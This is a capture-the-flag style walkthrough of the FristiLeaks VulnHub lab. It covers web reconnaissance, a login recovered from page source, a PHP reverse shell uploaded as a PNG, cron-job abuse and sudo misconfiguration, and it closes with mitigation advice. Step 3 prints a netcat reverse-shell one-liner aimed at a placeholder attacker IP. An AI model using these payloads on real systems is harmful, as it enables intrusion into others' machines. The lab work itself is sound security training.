# Fristi-Leaks-Lab

Objective

The FrisitLeaks is a small virtual machine designed with web vulnerabilities to be detected by the penetration testers. The goal of this excercise was to identify the vulnerabilities on the server, exploit the vulnerabilities to access the root id, capture the flag stored in the root directory.

Skills Learned
- Vulnerability assessment using Nmap and Gobuster
- Remote code Execution via the upload of PHP scripts
- Privilege Escalatio techniqe in order to gain unauthenticated access.
- Problem solving and critical thinking in finding and exploitng vulnerabilites.
- Directory traversal attacks.
- Directory brute-forcing.
- Exploitation of sudo binaries for privilege escalation.
- Documentation and reporting of vulnerabilites along with mitigation strategies.

Tools Used
- Nmap: Vulnerability analysis tool.
- Gobuster - Directory bruteforcing tool
- Whatweb - Web Enumeration tool
- VmWare workstation - virtual machine environment
- Kali Linux - Os used to carry out attacks and hosted on vmware.
- Python - used to run scripts written in python for privilege escalation
Steps
- Step 1: Install and configure Fristileaks virtual machine.
The  compressed target VM file was downloaded from the vulnhub platform, after the file was extracted and added to the VMware workstation as a virtual machine.

Ref 1: <img width="480" height="270" alt="Screenshot (47)" src="https://github.com/user-attachments/assets/aa72ab35-2f37-4530-88a4-5d18a4267b5b" />

- Step 2:  Vulnerability assessment.
The target machine was scanned using nmap, were the IP address of the machine was specified along with option -sV. The -sV directs nmap to check for the version of the current services run on any open port found. The purpose of this scan is to identify any open port and oudated service on the open port that can be exploited in order to get a foothold on the target machine. From the conducted scan, the port 80 was found open with apache web server running on it this signifies web application service running on the server to which can be exploited.

Ref 2:<img width="480" height="270" alt="Screenshot (35)" src="https://github.com/user-attachments/assets/df05425b-8568-4d5b-98df-0e3f3f98347b" />

For more investigation a directory brute force test was conducted via Gobuster, the tool uses a list of possible directory names and traverses through them in order to obtain possible web directories that can be accessed In order to find more vulnerabilities.

Ref 3: <img width="480" height="270" alt="Screenshot (28)" src="https://github.com/user-attachments/assets/6d46e2c4-77f1-4d03-89bb-76e87e7b70fc" />

From the scan three accessible directories where found, /robots.txt, /fristi, /index.html. Normally, the /robots.txt file carries sensitive information that can be used to exploit hence upon checking this, three users were found which were /bola, /sisi, /cola but unfortunately there was nothing intrested found after navigating to these users directories. The next approach was to navigate to the /fristi directory. After navigating to this directory a login page was found. after trying possible passwords lie admin:admin it was found to be inactive hence the next approach was to check the source code of the login page for any clues. From the source code two potential clues were obtained a username "eezeepz" and an md5 hash base64 encoded text. 

Ref 4: <img width="480" height="270" alt="Screenshot (30)" src="https://github.com/user-attachments/assets/625465c3-e338-4cbd-8226-06e33d56cbbd" />
Ref 5: <img width="480" height="270" alt="Screenshot (29)" src="https://github.com/user-attachments/assets/678841e7-78b4-4aa9-b689-148c17b3b331" />
Ref 6: <img width="480" height="270" alt="Screenshot (31)" src="https://github.com/user-attachments/assets/b4df5b9e-8725-4077-ae36-057390b0acbb" />

After decodeing the base64 encoded png image I found a text "keKkeKKeKKeKkEkkEk" indicating this could be a possible password. Now the next stage was to try potentially obtained credentials eezeepz:keKkeKKeKKeKkEkkEk. Attempting this login credential led to a successful login.

Ref 7: <img width="480" height="270" alt="Screenshot (32)" src="https://github.com/user-attachments/assets/5936347e-c40f-485d-bce0-e2b64e2b8234" />
Ref 8: <img width="480" height="270" alt="Screenshot (33)" src="https://github.com/user-attachments/assets/547d05fe-83f6-4ac6-8208-b9f31e548f1e" />

- Step 3: Exploitation - Gaining foothold of the machine.
  
From observaion of the website after successful login, an upload button was found which could indicate potential for remote code execution via file upload but in order to conclude a successful attempt has to be recorded.

Ref 8: <img width="480" height="270" alt="Screenshot (33)" src="https://github.com/user-attachments/assets/eecbcacd-254d-4e50-8190-8499783dfeb6" />
In attempt to gain remote code access, a custom php was used. This script was converted to png due to png being the requested format for upload. the script used is indicated below.


<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <LISTENING_PORT> >/tmp/f"); ?> 


The parameters "attacker_ip" and "listening_port" were replaced with the local host IP and the listening port. Upon uploading this script a remote shell was successfully generated indicating the machine has been successfully compromised.

Ref 9: <img width="480" height="270" alt="Screenshot (34)" src="https://github.com/user-attachments/assets/9d394905-3553-4ff4-9a09-6aca7cee5f31" />

From the image above, the shell generated in a dummy shell, in order to make it an interactive shell in which caommands such as "su" can be used  a Python one-liner is used to spawn a pseudo-terminal so commands such as su and sudo.

python -c 'import pty; pty.spawn("/bin/bash")'.

- Step 4: Privilege Escalation:

Initial foothold has been gained into the machine, the next approach is to escalate privileges to get root access. While naviagting through thr target machine three users were found, fristigod, admin, and eezeepz. Among these users available access is only restricted to eezeep. While going through the eezeepz directory a txt file was noticed which could be used a possible clue.

Ref 10: <img width="480" height="270" alt="Screenshot (49)" src="https://github.com/user-attachments/assets/7ebe3048-61f0-494a-a8cd-a54590247e43" />

From the text it shows that the current privilege access available is to the "usr/bin/*" directory hence, anything within this directory can be ran without root access. Also, it states that the "/tmp/runthis" script is added to the cronjob to be run every 1 minute hence, a directory traversal approach was adopted in order to append a script which would enable access to the admin user.

"echo "/usr/bin/../../bin/chmod -R 777 /home/admin" > /tmp/runthis"

Ref 11: <img width="480" height="270" alt="Screenshot (50)" src="https://github.com/user-attachments/assets/efc9f13b-e591-4bb9-aa58-d1cdcc3d61cf" />

After this script was executed, access to admin user, this user contained encoded texts in base64 format as well as a python script for encoding texts into base64 format. By reverse engineering the python script, it can be customized to decode base64 format instead of endoing it in order to to find out what the encrypted texts mean as they may be possible passwords to a user.

Ref 12: <img width="480" height="270" alt="Screenshot (51)" src="https://github.com/user-attachments/assets/9c731342-a2a9-47fd-84dd-2388501d6fd4" />

Testing the reverse engineered script with the first encoded text "mVGZ3O3omkJLmy2pcuTq" from text cryptedpass.txt yielded password "thisisalsopw123". Unfortunately this password did not work for root or fristigod but was able to login to admin hence, the first text is admin user password, the next text "RFn0AKnlMHMPIzpyuTI0ITG" from whoisyourgodnow.txt yielded "LetThereBeFristi!" as a possible password. Athough this password was not for the root user, Fristigod user was accessed using this password. 

Ref 13: <img width="480" height="270" alt="Screenshot (52)" src="https://github.com/user-attachments/assets/14b60cbb-6cbf-4e5b-b197-1ea5707a863a" />
Now that access has been granted to fristigod user sudo binaries can be tested for possible exploiation, upon running "sudo -l" directory It was noticed that the fristigod can run any script with /var/fristigod/.secret_admin_stuff/doCom as user fristi, this means the /bin/bash script can be run wiht the file path for possible root access.

Ref 14: <img width="480" height="270" alt="Screenshot (53)" src="https://github.com/user-attachments/assets/06cfbd73-fcd0-4224-9a96-78881c3016d4" />

After running the script, root access was successfully obtained. To finish the task and capture the flag the root directory was searched and fristileaks_secrets.txt file was obtained which indicates this may be the flag, after using cat display the file the flag was obtained as shown below:

Ref 15: <img width="480" height="270" alt="Screenshot (54)" src="https://github.com/user-attachments/assets/ab514f53-9e86-4505-909c-ecd8cd1dd4f5" />

Mitigation strategies to secure this machine from the penetration test carried out:

Reconnaissance, directory and port scanning (Nmap, Gobuster)
Issue: The webserver exposed directories (/robots.txt, /fristi, etc.) with sensitive information.

Mitigation:

- Configure strict permissions on web content (Try not to expose development/test directories).
- Use .htaccess or proper web server configs to restrict sensitive paths.
- Review and sanitize robots.txt — (avoid keeping sensitive details there).

Weak Web Application Login
Issue: The login page leaked a username (eezeepz) and an encoded password in source code.

Mitigation:

- Don’t hardcode credentials or secrets in HTML/JavaScript.
- Implement hardening techniques such as hashing and salting for password security.
- Enable multi-factor authentication for admin logins.
- Employ code reviews and security testing to catch credential leaks.

File Upload Exploit (Remote Code Execution)
Issue: The upload function allowed PHP code execution disguised as .png.

Mitigation:

- Enforce strict file type validation (MIME type + content inspection, not just file extension).
- Store uploaded files outside the web root.
- Disable execution permissions on upload directories (chmod 644 on uploads).
- Adoptation sandboxing or virus-scanning uploaded content.

Weak Shell Environment
Issue: After foothold, attacker easily upgraded to an interactive shell.

Mitigation:

- Use restricted shells for web service accounts (e.g., rbash, nologin).
- Apply principle of least privilege on the web service account.

Cronjob Exploitation
Issue: A world-writable file (/tmp/runthis) was executed as a higher-privileged user.

Mitigation:

- Never execute scripts from /tmp as they are mostly used by attackers to run malicious scripts.
- Use secure directories with correct ownership and restrictive permissions.
- Cronjob validation.
- Adopt SIEM tools such as (splunk,wazuh,ossec) to monitor /tmp files for intrsuion detection.

Insecure Home Directory Scripts
Issue: Admin had scripts and password files stored in plain text (cryptedpass.txt, whoisyourgodnow.txt).

Mitigation:

- Avoid storing passwords or secrets in plaintext files.
- Use environment variables or secret management solutions (e.g., HashiCorp Vault).
- Apply file permissions: sensitive files should be 600 and owned only by the user.

Sudo Misconfiguration (doCom)
Issue: User fristigod could execute /doCom as another user (fristi), which could run arbitrary commands.

Mitigation:

- Restrict sudo privilges to some specific safe binaries (e.g., service, systemctl).
- Use NOPASSWD carefully.
- Adopt Regular audit on /etc/sudoers for possible breach of integrity.

 

Ref 1: VMware Workstation – Imported FristiLeaks VM Interface
Ref 2: Nmap Scan Results – Apache Web Server Detected on Port 80
Ref 3: Gobuster Scan – Discovered Web Directories (/robots.txt, /fristi, /index.html)
Ref 4: Login Page Source Code – Encoded MD5/Password String Identified
Ref 5: Login Page Source Code – Username “eezeepz” Discovered
Ref 6: Base64 Encoded PNG Content Revealing Password String
Ref 7: Successful Login to /fristi Page with Discovered Credentials
Ref 8: Upload Functionality Identified on Web Application (Potential RCE)
Ref 9: Reverse Shell Access Gained via Malicious File Upload
Ref 10: User Directories Discovered (eezeepz, admin, fristigod)
Ref 11: Cronjob Exploitation – Script Added to /tmp/runthis
Ref 12: Admin User Directory – Python Script and Encoded Password Files Found
Ref 13: Decoded Credentials – Access to “fristigod” User via “LetThereBeFristi!”
Ref 14: Sudo Misconfiguration – fristigod Running doCom as fristi
Ref 15: Root Flag (fristileaks_secrets.txt) Retrieved from /root Directory

